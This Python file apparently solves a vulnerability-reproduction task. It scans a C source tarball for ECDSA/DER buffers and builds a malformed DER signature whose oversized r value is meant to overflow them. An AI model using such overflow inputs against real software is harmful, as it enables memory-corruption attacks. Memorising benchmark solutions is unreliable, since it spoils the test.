import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        r_len = self._infer_r_len(src_path)
        return self._make_ecdsa_sig_der(r_len=r_len, s_len=1)

    @staticmethod
    def _der_len(n: int) -> bytes:
        if n < 0:
            raise ValueError("negative length")
        if n < 0x80:
            return bytes([n])
        tmp = []
        while n > 0:
            tmp.append(n & 0xFF)
            n >>= 8
        tmp.reverse()
        return bytes([0x80 | len(tmp)]) + bytes(tmp)

    @classmethod
    def _make_ecdsa_sig_der(cls, r_len: int, s_len: int = 1) -> bytes:
        if r_len < 2:
            r_len = 2
        if s_len < 1:
            s_len = 1

        r_data = b"\x00\x80" + (b"A" * (r_len - 2))
        s_data = b"\x01" if s_len == 1 else (b"\x00\x80" + (b"B" * (s_len - 2)))

        int_r = b"\x02" + cls._der_len(len(r_data)) + r_data
        int_s = b"\x02" + cls._der_len(len(s_data)) + s_data

        content = int_r + int_s
        return b"\x30" + cls._der_len(len(content)) + content

    @staticmethod
    def _read_tar_text_files(src_path: str, max_file_bytes: int = 2_000_000) -> List[Tuple[str, str]]:
        out: List[Tuple[str, str]] = []
        try:
            with tarfile.open(src_path, mode="r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    low = name.lower()
                    if not (low.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".ipp", ".S", ".s"))):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(max_file_bytes + 1)
                    except Exception:
                        continue
                    if not data:
                        continue
                    if len(data) > max_file_bytes:
                        data = data[:max_file_bytes]
                    try:
                        txt = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    if txt:
                        out.append((name, txt))
        except Exception:
            pass
        return out

    @classmethod
    def _infer_r_len(cls, src_path: str) -> int:
        texts = cls._read_tar_text_files(src_path)

        array_decl_re = re.compile(
            r"""(?x)
            \b(?:uint8_t|u8|unsigned\s+char|char|byte)\s+
            (?P<name>[A-Za-z_]\w*)\s*
            \[\s*(?P<size>\d{1,6})\s*\]
            """
        )

        memcpy_re = re.compile(r"\bmem(?:cpy|move)\s*\(\s*([A-Za-z_]\w*)\s*,")
        decl_by_file: Dict[str, Dict[str, int]] = {}

        candidates: List[Tuple[int, int]] = []  # (size, confidence)
        need_large = False

        for fname, txt in texts:
            low = txt.lower()
            relevant = ("ecdsa" in low) and (("asn1" in low) or ("der" in low) or ("signature" in low) or ("sig" in low))
            if not relevant:
                continue

            if re.search(r"\b(short|int16_t)\b", low) and re.search(r"\b(len|length|size|sz)\b", low) and ("asn1" in low):
                need_large = True

            file_decls: Dict[str, int] = {}
            for m in array_decl_re.finditer(txt):
                nm = m.group("name")
                try:
                    sz = int(m.group("size"))
                except Exception:
                    continue
                if sz <= 0 or sz > 200000:
                    continue
                file_decls[nm] = sz

                nml = nm.lower()
                conf = 1
                if nml in ("r", "s", "rs", "sig", "signature", "sigbuf", "sig_buf", "sigder", "sig_der"):
                    conf = 2
                elif ("sig" in nml) or ("ecdsa" in nml) or ("asn1" in nml) or ("der" in nml) or ("buf" in nml) or ("tmp" in nml):
                    conf = 2
                candidates.append((sz, conf))

            decl_by_file[fname] = file_decls

            for mm in memcpy_re.finditer(txt):
                dest = mm.group(1)
                sz = file_decls.get(dest)
                if sz is None:
                    continue
                candidates.append((sz, 3))

        if not candidates:
            return 33000 if need_large else 8192

        max_conf = max(conf for _, conf in candidates)
        best_sizes = [sz for sz, conf in candidates if conf == max_conf]
        inferred = max(best_sizes) if best_sizes else max(sz for sz, _ in candidates)

        if max_conf < 3 and inferred < 512:
            r_len = 8192
        else:
            r_len = inferred + 16

        if need_large and r_len <= 0x7FFF:
            r_len = 0x8000 + 64

        if r_len < 256:
            r_len = 256

        if r_len > 120000:
            r_len = 120000

        return r_len